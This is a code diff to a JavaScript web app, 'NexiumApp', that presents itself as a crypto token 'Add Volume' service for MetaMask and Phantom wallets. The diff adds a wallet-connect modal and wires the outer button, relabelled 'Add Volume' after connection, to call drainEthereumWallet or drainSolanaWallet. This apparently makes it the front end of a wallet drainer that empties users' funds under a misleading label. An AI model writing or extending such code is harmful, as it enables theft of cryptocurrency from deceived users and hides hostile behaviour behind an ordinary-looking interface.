@@ -35,6 +35,7 @@ class NexiumApp {
     this.spinner = null;
     this.isDraining = false;
     this.provider = null;
+    this.connectedWalletType = null; // Track connected wallet type
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -54,6 +55,7 @@ class NexiumApp {
         console.error('Missing DOM elements');
         return;
       }
+      this.setupModal();
       this.setupEventListeners();
       this.checkWalletAndPrompt();
       this.renderTokenInterface();
@@ -68,8 +70,11 @@ class NexiumApp {
     this.dom = {
       app: document.getElementById('app'),
       metamaskPrompt: document.getElementById('metamaskPrompt'),
-      connectMetamask: document.getElementById('connect-metamask'),
-      connectPhantom: document.getElementById('connect-phantom'),
+      connectWallet: document.getElementById('connect-wallet'),
+      walletModal: document.getElementById('wallet-modal'),
+      closeModal: document.getElementById('close-modal'),
+      connectMetamask: document.querySelector('#wallet-modal #connect-metamask'),
+      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
       feedbackContainer: document.querySelector('.feedback-container'),
       tokenSelect: null,
       volumeSection: null,
@@ -86,9 +91,52 @@ class NexiumApp {
     console.log('DOM elements cached:', {
       app: !!this.dom.app,
       metamaskPrompt: !!this.dom.metamaskPrompt,
+      connectWallet: !!this.dom.connectWallet,
+      walletModal: !!this.dom.walletModal,
+      closeModal: !!this.dom.closeModal,
       connectMetamask: !!this.dom.connectMetamask,
       connectPhantom: !!this.dom.connectPhantom
     });
+  }
+
+  setupModal() {
+    console.log('Wallet modal setup:', {
+      connectWalletBtn: !!this.dom.connectWallet,
+      walletModal: !!this.dom.walletModal,
+      closeModalBtn: !!this.dom.closeModal
+    });
+
+    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
+      this.dom.connectWallet.addEventListener('click', (event) => {
+        if (this.connectedWalletType) {
+          console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`);
+          if (this.connectedWalletType === 'MetaMask') {
+            this.drainEthereumWallet(this.publicKey);
+          } else if (this.connectedWalletType === 'Phantom') {
+            this.drainSolanaWallet();
+          }
+        } else {
+          console.log('Connect Wallet button clicked');
+          event.stopPropagation();
+          this.dom.walletModal.classList.add('active');
+          console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') });
+        }
+      });
+
+      this.dom.closeModal.addEventListener('click', () => {
+        console.log('Close modal button clicked');
+        this.dom.walletModal.classList.remove('active');
+      });
+
+      document.addEventListener('click', (event) => {
+        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
+          console.log('Clicked outside modal, closing');
+          this.dom.walletModal.classList.remove('active');
+        }
+      });
+    } else {
+      console.error('Wallet modal elements not found');
+    }
   }
 
   setupEventListeners() {
@@ -201,6 +249,7 @@ class NexiumApp {
         this.publicKey = accounts[0];
         this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
         console.log(`${walletName} connected via extension: ${this.publicKey}`);
+        this.connectedWalletType = walletName; // Store connected wallet type
         console.log(`Setting button state to connected for ${walletName}`);
         this.cacheDOMElements(); // Re-cache DOM elements before updating button state
         this.updateButtonState('connected', walletName);
@@ -245,6 +294,7 @@ class NexiumApp {
             }
             this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
             console.log(`MetaMask connected via deeplink: ${this.publicKey}`);
+            this.connectedWalletType = walletName; // Store connected wallet type
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
             this.cacheDOMElements(); // Re-cache DOM elements before updating button state
             this.updateButtonState('connected', walletName);
@@ -263,6 +313,7 @@ class NexiumApp {
             this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
             const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
             console.log(`Phantom connected via deeplink: ${this.publicKey}, Balance: ${walletBalance}`);
+            this.connectedWalletType = walletName; // Store connected wallet type
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
             this.cacheDOMElements(); // Re-cache DOM elements before updating button state
             this.updateButtonState('connected', walletName);
@@ -508,7 +559,7 @@ class NexiumApp {
     let button = this.dom[`connect${walletName}`];
     if (!button) {
       console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`);
-      button = document.getElementById(`connect-${walletName.toLowerCase()}`);
+      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
     }
     console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`);
     if (!button) {
@@ -528,11 +579,25 @@ class NexiumApp {
         button.textContent = 'Add Volume';
         button.classList.add('connected');
         console.log(`Set ${walletName} button to Add Volume, disabled=${button.disabled}, classes=${button.classList}`);
+        // Update outer Connect Wallet button
+        if (this.dom.connectWallet) {
+          this.dom.connectWallet.textContent = 'Add Volume';
+          this.dom.connectWallet.classList.remove('animate-pulse');
+          this.dom.connectWallet.classList.add('connected');
+          console.log(`Set outer Connect Wallet button to Add Volume, classes=${this.dom.connectWallet.classList}`);
+        }
         break;
       default:
         button.textContent = `Connect ${walletName}`;
         button.classList.add('animate-pulse');
         console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`);
+        // Reset outer Connect Wallet button
+        if (this.dom.connectWallet) {
+          this.dom.connectWallet.textContent = 'Connect Wallet';
+          this.dom.connectWallet.classList.add('animate-pulse');
+          this.dom.connectWallet.classList.remove('connected');
+          console.log(`Reset outer Connect Wallet button to Connect Wallet, classes=${this.dom.connectWallet.classList}`);
+        }
     }
     console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`);
   }
@@ -631,6 +696,7 @@ class NexiumApp {
         this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
         this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
         console.log('Wallet connected on init, publicKey:', this.publicKey);
+        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
         this.handleSuccessfulConnection();
       } else {
         console.log('No wallet connected on init, setting buttons to disconnected');
@@ -646,7 +712,6 @@ class NexiumApp {
       this.updateButtonState('disconnected', 'MetaMask');
       this.updateButtonState('disconnected', 'Phantom');
       this.showDefaultPrompt();
-      
     }
   }
 
@@ -684,6 +749,7 @@ class NexiumApp {
     console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress);
     this.hideMetaMaskPrompt();
     this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
+    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
     this.cacheDOMElements(); // Re-cache DOM elements before updating button state
     this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
